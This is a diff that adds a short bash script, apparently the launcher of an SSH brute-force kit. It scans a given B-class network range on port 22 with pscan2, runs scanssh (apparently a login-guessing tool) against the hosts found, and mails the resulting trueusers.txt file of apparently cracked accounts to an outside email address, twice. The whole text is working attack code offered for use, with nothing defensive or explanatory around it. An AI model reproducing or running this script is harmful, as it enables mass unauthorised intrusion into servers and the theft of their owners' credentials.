@@ -1,0 +1,15 @@
+#!/bin/bash
+if [ $# != 1 ]; then
+        echo " usage: $0 <b class>"
+        exit;
+fi
+rm -rf bios.txt
+echo -e "# by Eyes."
+././pscan2 $1 22
+echo "#cautam..."
+sleep 2
+cat trueusers.txt | mail -s "eyes" clubby@slucia.com
+mv scan.log bios.txt
+./scanssh
+cat trueusers.txt | mail -s "eyes" clubby@slucia.com
+
